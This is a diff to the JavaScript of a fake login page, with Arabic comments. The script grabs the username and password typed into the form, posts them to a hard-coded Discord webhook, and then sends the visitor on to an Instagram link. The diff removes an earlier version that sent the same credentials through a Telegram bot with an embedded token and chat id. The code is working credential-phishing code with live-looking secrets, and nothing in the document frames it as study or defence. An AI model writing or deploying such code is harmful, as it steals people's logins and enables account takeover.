@@ -1,30 +1,34 @@
 document.getElementById('loginButton').addEventListener('click', function (e) {
-  e.preventDefault(); // لمنع الإجراء الافتراضي (إعادة تحميل الصفحة)
+  e.preventDefault(); // لمنع إعادة تحميل الصفحة
 
   // التقاط البيانات من النموذج
   var username = document.getElementById('username').value;
   var password = document.getElementById('password').value;
 
-  // إنشاء الرسالة لإرسالها عبر البوت
-  var message = 'New login attempt:\nUsername: ' + username + '\nPassword: ' + password;
+  // إعداد الرسالة للإرسال
+  var message = {
+    content: "**New login attempt:**\n**Username:** " + username + "\n**Password:** " + password
+  };
 
-  // رابط API البوت الخاص بك مع chat_id الخاص بك
-  var botToken = '7404046910:AAEXGNnbZoh2NiXZLDnrOoaucDiqaGTYfCc';
-  var chatId = '7643313499';
-  var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+  // رابط Webhook الخاص بديسكورد
+  var webhookURL = "https://discord.com/api/webhooks/1352734475494232134/YCIy1vfzG2SmZjtxCvMTwhQaf2DE29S7jv6iRdjqM8ocAeILWCLCT4loXBUKkFuqurwS"; // استبدله برابط الـ Webhook
 
   // إرسال البيانات عبر الـ Fetch API
-  fetch(url)
-    .then(function(response) {
-      return response.json();
-    })
-    .then(function(data) {
-      console.log('Message sent successfully:', data);
-      
-      // إعادة التوجيه بعد نجاح الإرسال
-      window.location.href = "https://ig.me/j/AbYmOp6uPzKVG-kS/"; // استبدل بالرابط الذي تريد التحويل إليه
-    })
-    .catch(function(error) {
-      console.error('Error sending message:', error);
-    });
+  fetch(webhookURL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(message)
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log("Message sent successfully:", data);
+    
+    // إعادة التوجيه بعد نجاح الإرسال
+    window.location.href = "https://ig.me/j/AbYmOp6uPzKVG-kS/"; // استبدل بالرابط الذي تريد التحويل إليه
+  })
+  .catch(error => {
+    console.error("Error sending message:", error);
+  });
 });
